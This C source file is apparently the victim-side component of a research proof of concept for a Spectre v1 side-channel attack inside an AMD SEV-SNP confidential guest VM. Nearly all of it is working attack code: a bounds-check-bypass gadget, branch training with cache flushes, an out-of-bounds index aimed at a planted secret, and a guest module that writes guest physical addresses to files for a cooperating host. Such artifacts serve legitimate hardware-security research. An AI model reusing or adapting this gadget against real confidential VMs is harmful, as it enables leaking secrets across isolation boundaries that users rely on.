#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <x86intrin.h>

#include "../../guest-module/guest-module.h"
#include "../../guest-module/sev-guest-user.h"
#include "../../guest-utils/user-utils.h"

#define ROUNDS (int)100

#define SECRET "\xc5\x05\x8f\x54\x13\xa9\x21\x6a\x08\x2f\x33\x04\x37\xe3\x79\xad\xda\x04\xbe\x64\x06\x4b\x41\x96\xc9\x55\x82\x7f\x95\x57\x2e\xbd\x4d\x96\x0e\x3e\x02\x2a\xfc\x7d\xab\x5d\x5b\x4b\x45\xbe\xad\xde\x91\x76\x01\x41\x89\x6d\x21\x4b\x6a\x18\x23\xc1\xe8\xa6\x71\x21\x71\x3b\x59\x80\x60\xda\x58\x37\x8b\x91\x7a\xef\x11\xfd\x26\xff\x53\x11\xe0\x07\x12\xff\x25\xfa\x68\x78\x1d\xc1\x21\x21\x3d\x41\x53\xf9\x76\x97"

uint64_t trigger_ptr = 0;
unsigned int array1_size = 16;
uint8_t array1[16] = {
    0
};

uint8_t *array2;

char * secret = SECRET;

uint8_t temp = 0;

void victim_function(int16_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 4096];
    }
}

void run_gadget(int16_t malicious_x){
    int16_t j, training_x, x;

    while(*(uint64_t*)trigger_ptr == VM_WAIT){
    }
    asm volatile("mfence\n" "lfence\n");

    training_x = 0;
    x = 0;
    for (j = 1000; j >= 0; j--) {
        asm volatile("clflush (%%rbx) \n"::"b"(&array1_size):);

          x = ((j & (int16_t)0xFFF) - 1) & (~(int16_t)0xFFF);
          x = (x | (x >> 12));
          x = x & malicious_x;
          victim_function(x);
    }
    asm volatile("mfence\n" "lfence\n");
    *(uint64_t*)trigger_ptr = VM_WAIT;
}




int main(int argc, char ** argv){
    struct snp_guest_request_ioctl msg;
    msg.msg_version = 1;
    int fd = open("/dev/sev-guest", O_RDWR);
    ioctl(fd, SNP_ALLOC_SHARED_PAGE, &msg); 
    trigger_ptr = (uint64_t)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    *(uint64_t*)trigger_ptr = 1;
    close(fd);

    array2 = mmap(NULL, 512 * 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    madvise(array2, 512 * 4096, MADV_HUGEPAGE);
    memset(array2, 0, 512 * 4096);
    if(mlockall(MCL_CURRENT | MCL_FUTURE) != 0){
        perror("mlockall: error");
        exit(1);
    }

    // Get GPA of the page used by the Spectre gadget and store it into a file..
    FILE *fptr = fopen("/root/rr-artifact/spectre/victim/address", "w");
    uint64_t req;
    fd = open("/dev/guest-module", O_RDONLY);
    req = (uint64_t)array2;
    ioctl(fd, GET_GPA_HUGE_PAGE, &req);
    uint64_t array2_gpa = req;
    req = trigger_ptr;
    ioctl(fd, GET_GPA, &req);
    uint64_t trigger_gpa = req;
    close(fd);
    fprintf(fptr, "%lx\n", array2_gpa);
    fprintf(fptr, "%lx\n", trigger_gpa);
       fclose(fptr);

    // Get the pid and store it into a file.
    int pid = getpid();
    fptr = fopen("/root/rr-artifact/spectre/victim/pid", "w");
    fprintf(fptr, "%d", pid);
    fclose(fptr);


    // Modify the flag file. 
    // The host machine will check if the file has been modified to know when the victim program gets ready.
    char *filepath = "/root/rr-artifact/spectre/victim/flag";
    fptr = fopen(filepath, "w");
    fprintf(fptr, "1");
    fclose(fptr);

      int16_t malicious_x = (size_t)(secret - (char * ) array1);

    while(*(uint64_t*)trigger_ptr == VM_WAIT){
    }
    *(uint64_t*)trigger_ptr = VM_WAIT;

    while(*(uint64_t*)trigger_ptr == VM_WAIT){
    }
    // Warm up
    for(int j = 0; j < 256; j++){
        asm volatile ("mov (%%rbx), %%rax \n" "lfence\n"::"b"(&array2[j * 4096]):"%eax");
    }
    run_gadget(malicious_x);
    *(uint64_t*)trigger_ptr = VM_WAIT;
  
      for(int i = 0; i < ROUNDS; i++) {
        run_gadget(malicious_x);
        malicious_x++;
      }
    
    while(*(uint64_t*)trigger_ptr == VM_WAIT){
    }

    munlockall();
    munmap(array2, 4096 * 512);

    *(uint64_t*)trigger_ptr = VM_FINISH;
    return 0;
}
